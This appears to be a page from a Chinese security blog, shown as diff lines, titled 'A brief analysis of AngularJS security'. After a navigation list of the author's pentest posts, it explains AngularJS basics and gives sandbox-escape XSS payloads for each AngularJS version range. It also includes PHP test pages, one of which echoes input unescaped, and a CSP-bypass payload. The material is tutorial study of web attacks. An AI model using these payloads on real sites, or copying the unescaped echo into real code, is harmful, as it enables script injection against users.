+<li><a href="https://blog.csdn.net/SKI_12/article/details/63684778" target="_blank" rel="noopener">(旧博客)主动信息收集之主机发现的一些脚本</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/64906997" target="_blank" rel="noopener">(旧博客)主动信息收集之端口扫描</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/66473045" target="_blank" rel="noopener">(旧博客)主动信息收集之端口扫描的一些脚本</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78301318" target="_blank" rel="noopener">(旧博客)渗透测试之漏洞扫描阶段</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/57405291" target="_blank" rel="noopener">(旧博客)在Windows和Linux系统下隐藏痕迹的小技巧</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/57403811" target="_blank" rel="noopener">(旧博客)在Windows和Linux系统中的一些信息收集方法</a></li>
+</ul>
+</li>
+<li>Kali<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/76598873" target="_blank" rel="noopener">(旧博客)使用Kali无线渗透获取宿舍WiFi密码（WPA）</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/62239673" target="_blank" rel="noopener">(旧博客)关于Kali的两个Webshell（Webacoo和Weevely）的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/62064984" target="_blank" rel="noopener">(旧博客)关于Kali获取HTTP账号密码的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/62045632" target="_blank" rel="noopener">(旧博客)关于Kali进行ARP欺骗的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/61926977" target="_blank" rel="noopener">(旧博客)关于Kali进行ARP攻击的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/61920179" target="_blank" rel="noopener">(旧博客)在Kali中安装IBus的拼音输入法</a></li>
+<li></li>
+</ul>
+</li>
+<li>Metasploit<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/60881390" target="_blank" rel="noopener">(旧博客)关于Metasploit的学习笔记（一）</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/62427016" target="_blank" rel="noopener">(旧博客)关于Metasploit的学习笔记（二）</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/77103290" target="_blank" rel="noopener">(旧博客)Metasploit的Docker安装及其Eternal Blue（永恒之蓝）渗透实现</a></li>
+</ul>
+</li>
+<li>内网渗透<ul>
+<li><a href="/2020/02/15/内网渗透基础/">内网渗透基础与域环境搭建</a></li>
+<li><a href="/2020/02/18/Windows-PowerShell基础/">内网渗透之Windows PowerShell基础</a></li>
+<li><a href="/2020/02/27/内网信息收集之本机信息收集/">内网信息收集之本机信息收集</a></li>
+<li><a href="/2020/03/08/内网信息收集之域相关信息收集/">内网信息收集之域相关信息收集</a></li>
+</ul>
+</li>
+<li>提权<ul>
+<li><a href="/2019/01/01/关于本地提权的学习笔记（一）：Administrator提权到System">Administrator提权到System</a></li>
+<li><a href="/2019/01/01/关于本地提权的学习笔记（二）：注入进程和利用漏洞提权">注入进程和利用漏洞提权</a></li>
+</ul>
+</li>
+<li>免杀</li>
+<li>工具<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78333085" target="_blank" rel="noopener">(旧博客)Wireshark进阶之网络问题案例分析</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/61651960" target="_blank" rel="noopener">(旧博客)关于nmap所有的参数</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/60332892" target="_blank" rel="noopener">(旧博客)关于Xsser的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/60151041" target="_blank" rel="noopener">(旧博客)关于skipfish的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/58677137" target="_blank" rel="noopener">(旧博客)关于Vega的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/58188331" target="_blank" rel="noopener">(旧博客)关于SQLMAP所有参数的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/57418307" target="_blank" rel="noopener">(旧博客)关于NETCAT的学习笔记</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>OS</strong><ul>
+<li>Windows<ul>
+<li><a href="/2019/01/01/将Python脚本转换为exe">将Python脚本转换为exe</a></li>
+<li><a href="/2019/01/01/几个查看用户信息的Windows程序">几个查看用户信息的Windows程序</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78716967" target="_blank" rel="noopener">(旧博客)Windows系统安全小结</a></li>
+</ul>
+</li>
+<li>Linux<ul>
+<li><a href="/2020/03/28/Linux安全笔记/">Linux安全笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78169962" target="_blank" rel="noopener">(旧博客)Linux查找命令小结</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/72614754" target="_blank" rel="noopener">(旧博客)关于iptables防火墙的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/63680773" target="_blank" rel="noopener">(旧博客)关于Linux日志的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78837765" target="_blank" rel="noopener">(旧博客)Ubuntu搭建MongoDB集群</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><strong>云</strong><ul>
+<li>云安全</li>
+<li>Docker<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/76696436" target="_blank" rel="noopener">(旧博客)Docker基本命令以及Ubuntu16.04更换源</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/76713869" target="_blank" rel="noopener">(旧博客)使用Docker搭建基于MySQL、Apache和PHP的DVWA服务器</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+  </div>
+</div>
+</div>
+
+<header class="post-header text-center">
+	<h1 class="title">
+		浅析AngularJS安全
+	</h1>
+	<span class="read">
+		阅读量 <span id="busuanzi_value_page_pv"></span>
+	</span>
+</header><br>
+
+<div class="book-post">
+  <h2 id="0x01基本概念"><a href="#0x01基本概念" class="headerlink" title="0x01基本概念"></a>0x01基本概念</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>AngularJS是一个JavaScript框架，是以一个JavaScript文件形式发布的，可通过<code>&lt;script&gt;</code>标签添加到HTML页面（通过指令扩展了HTML，且通过表达式绑定数据到HTML）。</p>
+<p>通过<code>&lt;script&gt;</code>标签引入AngularJS的JS文件：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://code.angularjs.org/1.4.0/angular.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>各个版本的angular.js下载： <a href="https://github.com/angular/angular.js/releases" target="_blank" rel="noopener">https://github.com/angular/angular.js/releases</a></p>
+<p>在线版本：<a href="https://code.angularjs.org/" target="_blank" rel="noopener">https://code.angularjs.org/</a></p>
+<p>AngularJS使得开发现代的单一页面应用程序（SPAs：Single Page Applications）变得更加容易。</p>
+<ul>
+<li>AngularJS把应用程序数据绑定到HTML元素。</li>
+<li>AngularJS可以克隆和重复HTML元素。</li>
+<li>AngularJS可以隐藏和显示HTML元素。</li>
+<li>AngularJS可以在HTML元素”背后”添加代码。</li>
+<li>AngularJS支持输入验证。</li>
+</ul>
+<h3 id="AngularJS指令"><a href="#AngularJS指令" class="headerlink" title="AngularJS指令"></a>AngularJS指令</h3><p>AngularJS通过被称为指令的新属性来扩展HTML，通过内置的指令来为应用添加功能，并且允许你自定义指令。</p>
+<p>AngularJS指令是带有前缀<code>ng-</code>，几个常见指令如下：</p>
+<ul>
+<li>ng-app指令定义一个AngularJS应用程序。</li>
+<li>ng-model指令把元素值（比如输入域的值）绑定到应用程序。</li>
+<li>ng-bind指令把应用程序数据绑定到HTML视图。</li>
+<li>ng-init指令初始化应用程序数据。</li>
+</ul>
+<h3 id="AngularJS表达式"><a href="#AngularJS表达式" class="headerlink" title="AngularJS表达式"></a>AngularJS表达式</h3><p>AngularJS使用表达式把数据绑定到HTML，其中AngularJS表达式是写在双大括号内的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; expression &#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>AngularJS表达式把数据绑定到HTML，这与ng-bind指令有异曲同工之妙。</p>
+<p>AngularJS将在表达式书写的位置”输出”数据。</p>
+<p><strong>与JavaScript表达式的异同点：</strong></p>
+<ul>
+<li>类似于JavaScript表达式，AngularJS表达式可以包含字母，操作符，变量。</li>
+<li>与JavaScript表达式不同，AngularJS表达式可以写在HTML中。</li>
+<li>与JavaScript表达式不同，AngularJS表达式不支持条件判断，循环及异常。</li>
+<li>与JavaScript表达式不同，AngularJS表达式支持过滤器。</li>
+</ul>
+<h3 id="AngularJS应用"><a href="#AngularJS应用" class="headerlink" title="AngularJS应用"></a>AngularJS应用</h3><p>AngularJS模块（Module）定义了AngularJS应用。</p>
+<p>AngularJS控制器（Controller）用于控制AngularJS应用。</p>
+<p>ng-app指令指明了应用，ng-controller指明了控制器。</p>
+<p>ng-app指令位于应用的根元素下。对于单页Web应用（single page web application，SPA），应用的根通常为html元素。</p>
+<p>一个或多个ng-controller指令定义了应用的控制器。每个控制器有他自己的作用域：定义的HTML元素。</p>
+<p>AngularJS在HTML DOMContentLoaded事件中自动开始。如果找到ng-app指令，AngularJS载入指令中的模块，并将ng-app作为应用的根进行编译。应用的根可以是整个页面，或者页面的一小部分，如果是一小部分会更快编译和执行。</p>
+<h3 id="如何判断是否使用AngularJS"><a href="#如何判断是否使用AngularJS" class="headerlink" title="如何判断是否使用AngularJS"></a>如何判断是否使用AngularJS</h3><p>在当前页面F12打开Console，输入<code>angular.version</code>，若有返回版本信息则使用了：</p>
+<p><img src="/2020/03/29/浅析AngularJS安全/3.png" alt=""></p>
+<p>若未使用则会报错：</p>
+<p><img src="/2020/03/29/浅析AngularJS安全/1.png" alt=""></p>
+<h2 id="0x02-AngularJS沙箱逃逸"><a href="#0x02-AngularJS沙箱逃逸" class="headerlink" title="0x02 AngularJS沙箱逃逸"></a>0x02 AngularJS沙箱逃逸</h2><p>AngularJS是一个JavaScript框架，而针对JavaScript的Web攻击通常都是以XSS为主。</p>
+<p>由于AngularJS沙箱的存在，使得在AngularJS框架下的字符都被自动转码。如果想执行XSS攻击，就需要绕过AngularJS沙箱，这里由于支持AngularJS表达式，因此存在表达式注入来绕过沙箱的风险。</p>
+<p>对于可能存在XSS的地方，针对不同版本的angular需要输入不同的payload才能绕过沙箱执行XSS（一般需要确认输入字符未对<code>()&#39;</code>等特殊字符进行过滤）。</p>
+<p>测试代码如下，angular-bypass.php：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html ng-app&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;script src=&quot;https://code.angularjs.org/&#123;version&#125;/angular.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;p&gt;</span><br><span class="line">	&lt;?php</span><br><span class="line">		$q = $_GET[&apos;q&apos;];</span><br><span class="line">		echo htmlspecialchars($q,ENT_QUOTES);</span><br><span class="line">	?&gt;</span><br><span class="line">	&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>以下payload省略AngularJS表达式的标志符：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><p>要验证输入点是否存在XSS，最简单的PoC为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;2*3&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>当响应页面包含”6”字符串时即可证明存在XSS，后面就是针对AngularJS沙箱的绕过。</p>
+<p><img src="/2020/03/29/浅析AngularJS安全/2.png" alt=""></p>
+<h3 id="lt-1-1-5-或-gt-1-6-0（无沙箱）"><a href="#lt-1-1-5-或-gt-1-6-0（无沙箱）" class="headerlink" title="&lt;=1.1.5 或 &gt;=1.6.0（无沙箱）"></a>&lt;=1.1.5 或 &gt;=1.6.0（无沙箱）</h3><p>在1.1.5版本以前是还未存在沙箱的，因此能直接触发。而由于不断被绕过沙箱，在1.6.0以后的版本，官方干脆将沙箱都给撤掉了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">constructor.constructor(&apos;alert(1)&apos;)()</span><br><span class="line">或</span><br><span class="line">[].pop.constructor(&apos;alert(1)&apos;)()</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/29/浅析AngularJS安全/4.png" alt=""></p>
+<p><img src="/2020/03/29/浅析AngularJS安全/5.png" alt=""></p>
+<h3 id="1-2-0-1-2-18"><a href="#1-2-0-1-2-18" class="headerlink" title="1.2.0 - 1.2.18"></a>1.2.0 - 1.2.18</h3><p>当然，下面这个payload在无沙箱的版本中也能成功执行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=&apos;constructor&apos;;b=&#123;&#125;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,&apos;alert(1)&apos;)()</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/29/浅析AngularJS安全/6.png" alt=""></p>
+<h3 id="1-2-2-1-2-5"><a href="#1-2-2-1-2-5" class="headerlink" title="1.2.2 - 1.2.5"></a>1.2.2 - 1.2.5</h3><p>本地测试failed。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;a&apos;[&#123;toString:[].join,length:1,0:&apos;__proto__&apos;&#125;].charAt=&apos;&apos;.valueOf;$eval(&quot;x=&apos;&quot;+(y=&apos;if(!window\\u002ex)alert(window\\u002ex=1)&apos;)+eval(y)+&quot;&apos;&quot;);</span><br></pre></td></tr></table></figure>
+<h3 id="1-2-1-1-2-18"><a href="#1-2-1-1-2-18" class="headerlink" title="1.2.1 - 1.2.18"></a>1.2.1 - 1.2.18</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(_=&apos;&apos;.sub).call.call(&#123;&#125;[$=&apos;constructor&apos;].getOwnPropertyDescriptor(_.__proto__,$).value,0,&apos;alert(1)&apos;)()</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/29/浅析AngularJS安全/7.png" alt=""></p>
+<h3 id="1-2-19-1-2-23"><a href="#1-2-19-1-2-23" class="headerlink" title="1.2.19 - 1.2.23"></a>1.2.19 - 1.2.23</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">toString.constructor.prototype.toString=toString.constructor.prototype.call;[&quot;a&quot;,&quot;alert(1)&quot;].sort(toString.constructor)</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/29/浅析AngularJS安全/8.png" alt=""></p>
+<h3 id="1-2-24-1-2-26"><a href="#1-2-24-1-2-26" class="headerlink" title="1.2.24 -1.2.26"></a>1.2.24 -1.2.26</h3><p>1.1.5以下版本的是ok的，但是和网上说的1.2.24 -1.2.26版本的测试却没有弹框。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;[[&apos;__proto__&apos;]][&apos;x&apos;]=constructor.getOwnPropertyDescriptor;</span><br><span class="line">g=&#123;&#125;[[&apos;__proto__&apos;]][&apos;x&apos;];</span><br><span class="line">&#123;&#125;[[&apos;__proto__&apos;]][&apos;y&apos;]=g(&apos;&apos;.sub[[&apos;__proto__&apos;]],&apos;constructor&apos;);</span><br><span class="line">&#123;&#125;[[&apos;__proto__&apos;]][&apos;z&apos;]=constructor.defineProperty;</span><br><span class="line">d=&#123;&#125;[[&apos;__proto__&apos;]][&apos;z&apos;];</span><br><span class="line">d(&apos;&apos;.sub[[&apos;__proto__&apos;]],&apos;constructor&apos;,&#123;value:false&#125;);</span><br><span class="line">&#123;&#125;[[&apos;__proto__&apos;]][&apos;y&apos;].value(&apos;alert(1)&apos;)();</span><br></pre></td></tr></table></figure>
+<h3 id="1-2-24-1-2-29"><a href="#1-2-24-1-2-29" class="headerlink" title="1.2.24 - 1.2.29"></a>1.2.24 - 1.2.29</h3><p>本地测试failed。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;a&apos;.constructor.prototype.charAt=&apos;&apos;.valueOf;$eval(&quot;x=&apos;\&quot;+(y=&apos;if(!window\\u002ex)alert(window\\u002ex=1)&apos;)+eval(y)+\&quot;&apos;&quot;);</span><br></pre></td></tr></table></figure>
+<h3 id="lt-1-2-5-或-1-2-20-1-3-20"><a href="#lt-1-2-5-或-1-2-20-1-3-20" class="headerlink" title="&lt;=1.2.5 或 1.2.20 - 1.3.20"></a>&lt;=1.2.5 或 1.2.20 - 1.3.20</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;.&quot;)));alert(1)//&quot;;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/29/浅析AngularJS安全/9.png" alt=""></p>
+<h3 id="1-3-0-1-3-18"><a href="#1-3-0-1-3-18" class="headerlink" title="1.3.0 - 1.3.18"></a>1.3.0 - 1.3.18</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;[&#123;toString:[].join,length:1,0:&apos;__proto__&apos;&#125;].assign=[].join;</span><br><span class="line">&apos;a&apos;.constructor.prototype.charAt=&apos;&apos;.valueOf;</span><br><span class="line">$eval(&apos;x=alert(1)//&apos;);</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/29/浅析AngularJS安全/10.png" alt=""></p>
+<h3 id="1-3-3-1-3-18"><a href="#1-3-3-1-3-18" class="headerlink" title="1.3.3 - 1.3.18"></a>1.3.3 - 1.3.18</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;[&#123;toString:[].join,length:1,0:&apos;__proto__&apos;&#125;].assign=[].join;</span><br><span class="line">&apos;a&apos;.constructor.prototype.charAt=[].join;</span><br><span class="line">$eval(&apos;x=alert(1)//&apos;);</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/29/浅析AngularJS安全/11.png" alt=""></p>
+<h3 id="1-3-3-1-3-19"><a href="#1-3-3-1-3-19" class="headerlink" title="1.3.3 - 1.3.19"></a>1.3.3 - 1.3.19</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;a&apos;[&#123;toString:false,valueOf:[].join,length:1,0:&apos;__proto__&apos;&#125;].charAt=[].join;</span><br><span class="line">$eval(&apos;x=alert(1)//&apos;);</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/29/浅析AngularJS安全/12.png" alt=""></p>
+<h3 id="1-4-0-1-4-5（仅Chrome）"><a href="#1-4-0-1-4-5（仅Chrome）" class="headerlink" title="1.4.0 - 1.4.5（仅Chrome）"></a>1.4.0 - 1.4.5（仅Chrome）</h3><p>本地测试failed。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">o=&#123;&#125;;l=o[[&apos;__lookupGetter__&apos;]];(l=l)(&apos;event&apos;)().target.defaultView.location=&apos;javascript:alert(1)&apos;;</span><br></pre></td></tr></table></figure>
+<h3 id="1-4-2-1-5-8（仅Chrome和IE）"><a href="#1-4-2-1-5-8（仅Chrome和IE）" class="headerlink" title="1.4.2 - 1.5.8（仅Chrome和IE）"></a>1.4.2 - 1.5.8（仅Chrome和IE）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x=&#123;y:&apos;&apos;.constructor.prototype&#125;;x.y.charAt=[].join;[1]|orderBy:&apos;x=alert(1)&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/29/浅析AngularJS安全/13.png" alt=""></p>
+<h3 id="1-4-0-1-4-9"><a href="#1-4-0-1-4-9" class="headerlink" title="1.4.0 - 1.4.9"></a>1.4.0 - 1.4.9</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;a&apos;.constructor.prototype.charAt=[].join;$eval(&apos;x=1&#125; &#125; &#125;;alert(1)//&apos;);</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/29/浅析AngularJS安全/14.png" alt=""></p>
+<h3 id="1-3-3-1-5-8"><a href="#1-3-3-1-5-8" class="headerlink" title="1.3.3 - 1.5.8"></a>1.3.3 - 1.5.8</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x=&#123;y:&apos;&apos;.constructor.prototype&#125;;x[&apos;y&apos;].charAt=[].join;$eval(&apos;x=alert(1)&apos;);</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/29/浅析AngularJS安全/15.png" alt=""></p>
+<h3 id="1-4-10-1-6-2"><a href="#1-4-10-1-6-2" class="headerlink" title="1.4.10 - 1.6.2"></a>1.4.10 - 1.6.2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">c=&apos;&apos;.sub.call;</span><br><span class="line">b=&apos;&apos;.sub.bind;</span><br><span class="line">a=&apos;&apos;.sub.apply;</span><br><span class="line">c.$apply=$apply;</span><br><span class="line">c.$eval=b;</span><br><span class="line">op=$root.$$phase;</span><br><span class="line">$root.$$phase=null;</span><br><span class="line">od=$root.$digest;</span><br><span class="line">$root.$digest=(&#123;&#125;).toString;</span><br><span class="line">C=c.$apply(c);</span><br><span class="line">$root.$$phase=op;</span><br><span class="line">$root.$digest=od;</span><br><span class="line">B=C(b,c,b);</span><br><span class="line">$evalAsync(&quot;</span><br><span class="line">astNode=pop();</span><br><span class="line">astNode.type=&apos;UnaryExpression&apos;;</span><br><span class="line">astNode.operator=&apos;(window.X?void0:(window.X=true,alert(1)))+&apos;;</span><br><span class="line">astNode.argument=&#123;type:&apos;Identifier&apos;,name:&apos;foo&apos;&#125;;</span><br><span class="line">&quot;);</span><br><span class="line">m1=B($$asyncQueue.pop().expression,null,$root);</span><br><span class="line">m2=B(C,null,m1);</span><br><span class="line">[].push.apply=m2;</span><br><span class="line">a=&apos;&apos;.sub;</span><br><span class="line">$eval(&apos;a(b.c)&apos;);</span><br><span class="line">[].push.apply=a;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/29/浅析AngularJS安全/16.png" alt=""></p>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>第一次发布的AngularJS即 1.0 - 1.1.5 版本并没有沙箱。但AngularJS表达式被开发者限定为局部对象定义，这便阻止了在窗口对象中调用函数，由于被作用域限制，此时如果尝试调用alert会发现调用的是作用域对象而不是窗口对象，函数调用会失败。针对这种场景，Mario Heiderich发现可以使用构造函数属性来Bypass这个限制，即使用Function构造函数能在表达式中执行任意代码。</p>
+<p>在后来的版本中AngularJS添加了沙箱，但是对应的每个版本的沙箱都被Bypass，以至于AngularJS在1.6版本之后完全移除了沙箱，也就是说新版本的AngularJS是不用再费劲去沙箱逃逸了。</p>
+<h3 id="一道Bypass-CSP的题目"><a href="#一道Bypass-CSP的题目" class="headerlink" title="一道Bypass CSP的题目"></a>一道Bypass CSP的题目</h3><p>代码如下，bypass-csp.php：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html ng-app&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        header(&quot;Content-Security-Policy:default-src &apos;self&apos;;script-src code.angularjs.org &apos;self&apos;&quot;);</span><br><span class="line">    ?&gt;</span><br><span class="line">    &lt;script src=&quot;https://code.angularjs.org/&#123;version&#125;/angular.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        echo $_GET[&apos;q&apos;];</span><br><span class="line">    ?&gt;</span><br><span class="line">&lt;/p&gt;   </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到，整个HTML在AngularJS沙箱下，其中CSP限制script标签的脚本只能是加载code.angularjs.org域的或self的。</p>
+<p>具体过程这里不做分析，payload如下（仅Chrome）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bypass-csp.php?q=&lt;input+autofocus ng-focus=&quot;$event.path|orderBy:&apos;!x?[].constructor.from([x=1],alert):0&apos;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/29/浅析AngularJS安全/17.png" alt=""></p>
+<h2 id="0x03-AngularJS危险函数调用"><a href="#0x03-AngularJS危险函数调用" class="headerlink" title="0x03 AngularJS危险函数调用"></a>0x03 AngularJS危险函数调用</h2><p>AngularJS中一些特定功能的函数并不会对字符进行转码，因此当使用不当时可以执行JS表达式进行XSS攻击。</p>
+<p>AngularJS危险函数列表如下，当然这里只列了最简单的，其他很多的请查阅资料：</p>
+<table>
+<thead>
+<tr>
+<th>危险函数</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>$eval()</td>
+<td>会在当前作用域中执行一个表达式并返回结果</td>
+</tr>
+<tr>
+<td>$parse()</td>
+<td>将一个表达式转换为一个函数。这个函数可以被调用，其中的参数是一个上下文对象，通常来说是作用域。</td>
+</tr>
+<tr>
+<td>trustAs(type, value)</td>
+<td>关闭对应的$sce（strict contextual escaping）即严格的上下文逃逸限制</td>
+</tr>
+<tr>
+<td>trustAsHtml(type, value)</td>
+<td>关闭对应的$sce（strict contextual escaping）即严格的上下文逃逸限制</td>
+</tr>
+<tr>
+<td>parseAsHtml(expression)</td>
+<td>解析为HTML代码</td>
+</tr>
+<tr>
+<td><code>angular.element(someElement).html(&quot;&lt;html&gt;&quot;+userContent);</code></td>
+<td>DOM插入HTML</td>
+</tr>
+<tr>
+<td>$sce.enabled(false);</td>
+<td>关闭自动转义</td>
+</tr>
+<tr>
+<td>$sceProvider.enabled(false);</td>
+<td>关闭自动转义</td>
+</tr>
+</tbody>
+</table>
+<p>还有一种情况就是，  使用管道符时的条件外部可控：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; value | orderBy:userContent &#125;&#125;.filter(&apos;&apos;,function()&#123;&#125;)</span><br></pre></td></tr></table></figure>
+<h2 id="0x04-AngularJS安全措施"><a href="#0x04-AngularJS安全措施" class="headerlink" title="0x04 AngularJS安全措施"></a>0x04 AngularJS安全措施</h2><p>参考官网描述：<a href="https://angular.cn/guide/security" target="_blank" rel="noopener">https://angular.cn/guide/security</a></p>
+<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://www.runoob.com/angularjs/angularjs-tutorial.html" target="_blank" rel="noopener">AngularJS 教程</a></p>
+<p><a href="https://seaii-blog.com/index.php/2017/09/02/68.html" target="_blank" rel="noopener">AngularJS沙盒逃逸姿势总结</a></p>
